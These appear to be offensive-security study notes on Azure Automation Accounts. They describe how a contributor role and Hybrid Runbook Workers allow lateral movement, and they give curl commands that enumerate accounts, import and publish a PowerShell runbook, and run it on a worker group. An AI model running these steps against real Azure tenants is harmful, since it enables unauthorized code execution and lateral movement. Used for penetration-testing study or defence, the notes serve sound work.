---
title: Automation Accounts & Runbooks
---

[[notes/azure/index]] Automation Accounts allow to automate tasks for Azure resources, [[notes/azure/escalation-onprem|on-prem infrastructure]] and other cloud providers.

Common scenarios:

- deploy VMs across a hybrid environment using runbooks
- identify configuration changes
- configure VMs
- retrieve inventory

What is a Run As Account?

- provides authentication for managing Azure resources
- on creation a service principal is created and assigned the contributor role on the current subscription
- can only be used from inside a Runbook
- recommended to use managed identities instead
- can be abused with the contributor role on a Runbook

What is a Runbook?

- executed in context of the Run As Account
- contains code for automation logic
- code might contain credentials
- Runbooks can be executed in the cloud or by a Hybrid Runbook Worker, the latter allows lateral movement to on-prem
- maybe can run commands on Azure VMs using Desired State Configuration (DSC) ([source](http://web.archive.org/web/20231019211210/https://scribe.rip/@cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe))

Enumerate automation accounts.

~~~ bash
curl -sSf "https://management.azure.com/subscriptions/$subscription_id/providers/Microsoft.Automation/automationAccounts?api-version=2021-06-22" -H 'Content-Type: application/json' -H "Authorization: Bearer $arm_token" | jq -r '.value[]'
~~~

Enumerate the role assignments on an automation account and resolve its role definitions.

~~~ bash
curl -sSf "https://management.azure.com/subscriptions/$subscription_id/resourceGroups/Engineering/providers/Microsoft.Automation/automationAccounts/HybridAutomation/providers/Microsoft.Authorization/roleAssignments?api-version=2020-08-01-preview" -H "Authorization: Bearer $arm_token" | jq -r '.value[].properties.roleDefinitionId'
curl -sSf "https://management.azure.com/subscriptions/$subscription_id/resourceGroups/Engineering/providers/Microsoft.Automation/automationAccounts/HybridAutomation/providers/Microsoft.Authorization/roleDefinitions/$role_def_id?api-version=2022-04-01' -H "Authorization: Bearer $arm_token" | jq -r '.properties'
~~~

Enumerate hybrid worker groups.

~~~ bash
curl -sSf "https://management.azure.com/subscriptions/$subscription_id/resourceGroups/Engineering/providers/Microsoft.Automation/automationAccounts/HybridAutomation/hybridRunbookWorkerGroups?api-version=2022-08-08" -H "Authorization: Bearer $arm_token" | jq -r '.value[]'
~~~

Import a PowerShell script as Runbook.

~~~ bash
curl -sSf "https://management.azure.com/subscriptions/$subscription_id/resourceGroups/Engineering/providers/Microsoft.Automation/automationAccounts/HybridAutomation/runbooks/student57?api-version=2022-08-08" -d '{"properties":{"runbookType":"PowerShell"},"name":"student57","location":"switzerlandnorth"}' -X PUT -H 'Content-Type: application/json' -H "Authorization: Bearer $arm_token" | jq
curl -sSf "https://management.azure.com/subscriptions/$subscription_id/resourceGroups/Engineering/providers/Microsoft.Automation/automationAccounts/HybridAutomation/runbooks/student57/draft/content?api-version=2022-08-08" --data-binary @work.ps1 -X PUT -H "Authorization: Bearer $arm_token"
curl -sSf "https://management.azure.com/subscriptions/$subscription_id/resourceGroups/Engineering/providers/Microsoft.Automation/automationAccounts/HybridAutomation/runbooks/student57/publish?api-version=2022-08-08" -d '' -H 'Content-Type: application/json' -H "Authorization: Bearer $arm_token"
~~~

Execute a Runbook on a worker group.

~~~ bash
curl -sSf "https://management.azure.com/subscriptions/$subscription_id/resourceGroups/Engineering/providers/Microsoft.Automation/automationAccounts/HybridAutomation/jobs/$(uuidgen -r)?api-version=2022-08-08" -d '{"properties":{"runbook":{"name":"student57"},"parameters":{},"runOn":"Workergroup1"}}' -X PUT -H 'Content-Type: application/json' -H "Authorization: Bearer $arm_token" | jq -r .id
curl -sSf "https://management.azure.com/subscriptions/$subscription_id/resourceGroups/Engineering/providers/Microsoft.Automation/automationAccounts/HybridAutomation/jobs/$job_id?api-version=2022-08-08" -H 'Content-Type: application/json' -H "Authorization: Bearer $arm_token" | jq -r .properties
~~~

References:

- [Azure Persistence with Desired State Configurations](http://web.archive.org/web/20230726150132/https://www.netspi.com/blog/technical/cloud-penetration-testing/azure-persistence-with-desired-state-configurations/)
- [Azure Attack Paths - Azure Automation Hybrid Runbook Worker](http://web.archive.org/web/20231028211850/https://cloudbrothers.info/azure-attack-paths/#azure-automation-hybrid-runbook-worker)
- [Azure Attack Paths - Desired State Configuration](http://web.archive.org/web/20231028211850/https://cloudbrothers.info/azure-attack-paths/#desired-state-configuration)
- [Managed Identity Attack Paths, Part 1: Automation Accounts](http://web.archive.org/web/20231028211603/https://scribe.rip/@specterops/managed-identity-attack-paths-part-1-automation-accounts-82667d17187a)
- [Azure attack paths: Common findings and fixes (part 1)](http://web.archive.org/web/20231006124147/https://blog.zsec.uk/azure-fundamentals-pt1/)
